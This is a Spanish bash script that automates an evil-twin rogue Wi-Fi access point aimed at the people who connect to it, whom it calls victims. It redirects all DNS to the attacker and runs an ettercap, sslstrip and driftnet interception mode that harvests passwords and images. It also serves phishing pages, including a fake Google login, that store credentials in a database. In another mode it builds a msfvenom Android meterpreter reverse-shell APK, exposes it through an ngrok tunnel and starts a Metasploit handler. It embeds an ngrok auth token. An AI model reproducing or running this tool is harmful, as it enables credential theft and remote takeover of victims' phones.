#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
YELLOW=$(tput bold ; tput setaf 3)

if [ $(id -u) -eq 0 ]; then
    echo ""

else
  echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
  exit
fi


trap ctrl_c INT

function ctrl_c(){
    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
    rm dnsmasq.conf hostapd.conf 2>/dev/null
    rm -r iface 2>/dev/null
    find \-name datos-privados.txt | xargs rm 2>/dev/null
    sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
    iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
    ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
    tput cnorm; service networking restart

    echo -e "\n${yellowColour}Gracias por usar esta herramienta, Buena Suerte...${endColour}\n"
    echo -e "${redColour}By Daniel Reyero${endColour}"
    exit 0
}

echo -e "${redColour}
            //\\           /\\
           //  \\         /  \\
          //    \\       /    \\
         //      \\     /      \\
        //        \\   /        \\
       //__________\|/__________\\          ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}Daniel Reyero - ${endColour}${purpleColour}Creación de un punto de acceso falso${endColour}${yellowColour})${endColour}${redColour}
        \\          /|\          //
         \\        / | \        //
          \\      /  |  \      //
           \\____/___|___\____//
                  /   \\
                 /     \\
                /       \\
               /         \\
              /___________\\
"


    sleep 1.5; counter=0
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
    sleep 1

    dependencias=("hostapd" "dnsmasq" "sslstrip" "driftnet" "airbase-ng" "ettercap" "httrack" "mysql" "gnome-terminal")

    for programa in "${dependencias[@]}"; do
        if [ "$(command -v $programa)" ]; then
            echo -e ". . . . . . . . ${blueColour}[✔]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} se encuentra instalada"
            let counter+=1
        else
            echo -e "${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} $programa${endColour}${grayColour} no se encuentra instalada"
        fi; sleep 0.4
    done

    if [ "$(echo $counter)" == "9" ]; then
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
        sleep 3
    else
        echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas instaladas para ejecutar este script${endColour}\n"
        tput cnorm; exit
    fi


function getCredentials(){

    activeHosts=0
    tput civis; while true; do
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
        for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
        echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
        find \-name datos-privados.txt | xargs cat 2>/dev/null
        for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
        sleep 3; clear
    done
}

mkdir -p /tmp/Wifi
sleep  1
    clear; if [[ -e credenciales.txt ]]; then
        rm -rf credenciales.txt
    fi

    echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Seleccione su interfaz para ser usada para el AP falso:${endColour}"; sleep 1

    # Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
    airmon-ng start wlan0 > /dev/null 2>&1; interfaces=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2 |awk {'print $1'} |grep -v lo`
    echo $YELLOW  
    select choosed_interface in $interfaces; do
            echo -e "\nSeleccionaste: ${blueColour}$choosed_interface${endColour}"
          break;
    done;
    # checker=0; while [ $checker -ne 1 ]; do
    #   echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read choosed_interface

    #   for interface in $(cat iface); do
    #       if [ "$choosed_interface" == "$interface" ]; then
    #           checker=1
    #       fi
    #   done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
    # done

    rm iface 2>/dev/null
    echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Ingrese el nombre que le gustaría que se llamara su AP Wifi Falso, o presione enter para usar Fake_AP:${endColour} " && read -r use_ssid
    if [ "$use_ssid" = "" ];then
            use_ssid="Fake_AP"
            echo -e "\n${blueColour}Selecciono el nombre $use_ssid por defecto.${endColour}\n"
        else
            echo -e "\n${blueColour}Selecciono el nombre $use_ssid.${endColour}\n"
    fi
    echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
    if [ "$use_channel" = "" ];then
            use_channel="10"
            echo -e "\n${blueColour}Selecciono el canal 10 por defecto.${endColour}"
        else
            echo -e "\n${blueColour}Selecciono el canal $use_channel.${endColour}"

    fi
    echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
    sleep 2
    killall network-manager networking hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5

    echo -e "interface=$choosed_interface\n" > hostapd.conf
    echo -e "driver=nl80211\n" >> hostapd.conf
    echo -e "ssid=$use_ssid\n" >> hostapd.conf
    echo -e "hw_mode=g\n" >> hostapd.conf
    echo -e "channel=$use_channel\n" >> hostapd.conf
    echo -e "macaddr_acl=0\n" >> hostapd.conf
    echo -e "auth_algs=1\n" >> hostapd.conf
    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

    echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
    sleep 2
    echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
#    gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; hostapd hostapd.conf ; $SHELL"
    hostapd hostapd.conf > /dev/null 2>&1 &
    sleep 6

    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
    echo -e "server=8.8.8.8\n" >> dnsmasq.conf
    echo -e "log-queries\n" >> dnsmasq.conf
    echo -e "log-dhcp\n" >> dnsmasq.conf
    echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
    echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf

    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
    sleep 1
    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
    sleep 1
#    gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; dnsmasq -C dnsmasq.conf -d ; $SHELL"
    dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
    sleep 5
clear

echo -e "${YELLOW}Elige entre cuatro modos de ataque:${NC}"
echo
echo -e "${redColour}POR FAVOR USE ESTA OPCIÓN RESPONSABLEMENTE.${endColour}\n"
echo -e "${yellowColour}1)${endColour} ${purpleColour}Se ejecutarán ettercap y sslstrip junto a una página web de login.${endColour}"
echo -e "${yellowColour}2)${endColour} ${purpleColour}La página web está conectada a una base de datos programada en php y creacion de apk maliciosa.${endColour}"
echo -e "${yellowColour}3)${endColour} ${purpleColour}Página web de Google-login${endColour}"
echo -e "${yellowColour}4)${endColour} ${purpleColour}Utilizar una plantilla propia${endColour}"
while true; do
echo -n " #? "
read yn
case $yn in
1 ) AIRBASE=1 ; break ;;
2 ) AIRBASE=0 ; break ;;
3 ) AIRBASE=2 ; break ;;
4 ) AIRBASE=3 ; break ;;
* ) echo -e "${RED}Opción inválida${NC}" ;;
esac
done
sleep 2
clear

echo -e "${GREEN}"

if [ "$AIRBASE" = "1" ]; then
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} colorlib${endColour}\n"; sleep 1
pushd colorlib > /dev/null 2>&1
php -S 192.168.1.1:80 > /dev/null 2>&1 &
sleep 2
popd > /dev/null 2>&1; # getCredentials

# rm -rf /var/www/html
# mkdir -p /var/www/html
# httrack https://colorlib.com/etc/lf/Login_v5/index.html -O /var/www/html
mkdir -p $HOME/Wifi

# Sslstrip

echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando sslstrip...${endColour}" 

sslstrip -f -p -k -l 10000 -w $HOME/Wifi/sslstrip.log sslstripid=$! > /dev/null 2>&1 &
sleep 2

# Ettercap
echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando ettercap...${endColour}"

gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; ettercap -p -u -T -q -w /tmp/Wifi/etter.cap -i wlan0mon & ettercapid=$! ; $SHELL"


sleep 2

# Driftnet
echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando driftnet...${endColour}"

mkdir -p "/tmp/Wifi/Images_$(date +%d%m%y)"
driftnet -i wlan0mon -a -d /tmp/Wifi/Images_$(date +%d%m%y) > /dev/null & dritnetid=$!
sleep 2



clear
echo $YELLOW
echo -e "${yellowColour}La herramienta esta ejecutada, después de que la víctima sea conectada e introduzca sus credenciales se mostrarán en ettercap.
Ettercap también guardará su salida en ${endColour}${purpleColour}$HOME/Wifi/etter.cap${endColour}
${yellowColour}Las contraseñas capturadas se guardarán en${endColour} ${purpleColour}$HOME/Wifi/passwords.txt${endColour}
${yellowColour}Las imágenes capturadas se guardarán en${endColour} ${purpleColour}$HOME/Wifi/driftftnetdata${endColour}"
echo
echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla...${endColour}"

read junk
# copiado de contraseñas obtenidas para ser guardadas
count=$(grep -c "Referer" /tmp/Wifi/etter.cap)
for i in $(seq 1 $count) 
do
  value=$(grep -a "Referer" /tmp/Wifi/etter.cap | awk -v i="$i" 'NR==i{print $2}')
  echo "$value" >> $HOME/Wifi/passwords.txt
done

if [ -f "$HOME/Wifi/passwords.txt" ]; then
    echo -e "${yellowColour}[*]${endColour}${grayColour} Contraseñas Guardadas !${endColour}"
else
    echo -e "${redColour}[*]${endColour}${grayColour} Error al guardar contraseñas !${endColour}"
fi

cp -rf /tmp/Wifi/Images_$(date +%d%m%y) $HOME/Wifi
if [ -d "$HOME/Wifi/Images_$(date +%d%m%y)" ]; then
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Imágenes Guardadas !${endColour}"
else
    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al guardar imágenes !${endColour}"
fi

cp -rf /tmp/Wifi/etter.cap $HOME/Wifi
if [ -f "$HOME/Wifi/etter.cap" ]; then
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Captura de Archivo Guardada !${endColour}"
else
    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al capturar el archivo !${endColour}"
fi

    
    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
    rm dnsmasq.conf hostapd.conf 2>/dev/null
    rm -r iface 2>/dev/null
    find \-name datos-privados.txt | xargs rm 2>/dev/null
    sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
    iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
    ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
    tput cnorm; service networking restart
    
echo -e "\n${yellowColour}Gracias por usar esta herramienta, Buena Suerte...${endColour}\n"
echo -e "${redColour}By Daniel Reyero${endColour}"

kill ${sslstripid} > /dev/null 2>&1
kill ${ettercapid} > /dev/null 2>&1
kill ${dritnetid} > /dev/null 2>&1

exit
fi
# SEGUNDA PARTE de pagina web

if [ "$AIRBASE" = "0" ]; then

        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} Web_BBDD${endColour}\n"; sleep 1
        pushd Web_BBDD > /dev/null 2>&1
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        popd > /dev/null 2>&1; # getCredentials

    service mysql start 

#   sleep 1
#   rm -rf /var/www/html
#   mkdir -p /var/www/html
  

# Mueve el archivo HTML al directorio de Apache
# sudo cp -r /home/kali/Desktop/Rogueap-eviltwin/Web_BBDD/* /var/www/html/

# Informa al usuario que la página ha sido creada
sleep 2
#ejecuta el script de la base de datos
source utilities/bbdd.sh  > /dev/null 2>&1 &
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Página web y base de datos creadas con éxito ${endColour} "

sleep 2

# Pedimos al usuario que introduzca el puerto que se usará para la conexión inversa
echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Introduce el puerto que se usará para la conexión inversa: ${endColour} " && read lport
if [ "$lport" = "" ];then
            lport="4646"
            echo -e "\n${blueColour}Selecciono el puerto $lport por defecto.${endColour}"
        else
            echo -e "\n${blueColour}Selecciono el puerto $lport.${endColour}"
    fi
echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Introduce el nombre que quieres dar a la aplicación: ${endColour} " && read app
if [ "$app" = "" ];then
            app="Aplicacion"
            echo -e "\n${blueColour}Selecciono el nombre $app por defecto.${endColour}"
        else
            echo -e "\n${blueColour}Selecciono el nombre $app.${endColour}"
    fi

# Verificamos si el token de autorización de ngrok ya está configurado
if [ -f ~/.ngrok2/ngrok.yml ]; then
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Token de autorización de ngrok ya configurado. ${endColour}"
else
    # Solicitamos al usuario que introduzca el token de autorización de ngrok
    echo -e "\n${blueColour}[Información]${endColour}${yellowColour} Si quieres saber cual es tu token ve a este link y registrate: https://dashboard.ngrok.com/get-started/your-authtoken${endColour} " 

    echo -ne "\n${redColour}[!] Introduce el token de autorización de ngrok (Pj: 2Pt10va9BqUhHMzciFAtXtVp4t6_6e5Btjn8emhQYHExAuW2S): ${endColour} " && read token
    if [ "$token" = "" ];then
            token="2Pt10va9BqUhHMzciFAtXtVp4t6_6e5Btjn8emhQYHExAuW2S"
            echo -e "\n${blueColour}Selecciono el token $token por defecto.${endColour}"
    fi

    # Configuramos el token de autorización en ngrok
    ./ngrok authtoken $token > /dev/null 2>&1 &
fi
sleep 1
# Creamos el servidor tcp con ngrok
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Creando servidor tcp con ngrok...${endColour}"
./ngrok tcp $lport > /dev/null &

sleep 5

# Obtenemos la URL pública del servidor de ngrok
public_url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | awk -F '//' '{print $2}' | cut -d ':' -f 1)

# Creamos la APK con msfvenom
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Creando APK con msfvenom... ${endColour}"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$public_url LPORT=$lport -o $app.apk > /dev/null 2>&1

# Movemos el archivo al servidor apache
sleep 1

sed -i '/<\/div>/i \        <p>Descarga nuestra aplicación Android aquí: <a href="'${app}'.apk">Descargar</a></p>' Web_BBDD/index.html


mv $app.apk Web_BBDD/ > /dev/null 2>&1

# Esperamos a que metasploit esté listo para recibir conexiones
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando a que metasploit esté listo para recibir conexiones...${endColour}"
sleep 10

# Configuramos el exploit en metasploit con los parámetros adecuados
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando exploit en metasploit con los parámetros adecuados...${endColour}\n"
echo "use exploit/multi/handler" > metasploit.rc
echo "set payload android/meterpreter/reverse_tcp" >> metasploit.rc
echo "set LHOST 0.0.0.0" >> metasploit.rc
echo "set LPORT $lport" >> metasploit.rc
echo "exploit" >> metasploit.rc

sleep 2

# Ejecutamos el archivo de configuración en metasploit
gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; msfconsole -r metasploit.rc msfid=$! ; $SHELL"

sleep 2

clear
echo $YELLOW
echo "Todas las contraseñas que sean introducidas en esta página web seran guardadas en una base de datos."
echo
echo -e "Para acceder a las contraseñas almacenadas dentro de la base de datos. $DB_NAME
   ${purpleColour} 1.- mysql
    2.- USE rogue_ap;
    3.- SELECT * FROM credenciales;${endColour}"
    
echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"

while true; do
    sleep 1
done
fi


if [ "$AIRBASE" = "2" ]; then

        tput civis; pushd google-login > /dev/null 2>&1
        echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
        php -S 192.168.1.1:80 > /dev/null 2>&1 &
        sleep 2
        popd > /dev/null 2>&1; getCredentials

fi

if [ "$AIRBASE" = "3" ]; then

        tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
	    echo -ne "${yellowColour}[*]${endColour}${grayColour}Nombre de la plantilla a utilizar:${endColour} " && read template

		tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
		pushd $template > /dev/null 2>&1
		php -S 192.168.1.1:80 > /dev/null 2>&1 &
		sleep 2
		popd > /dev/null 2>&1; getCredentials

fi
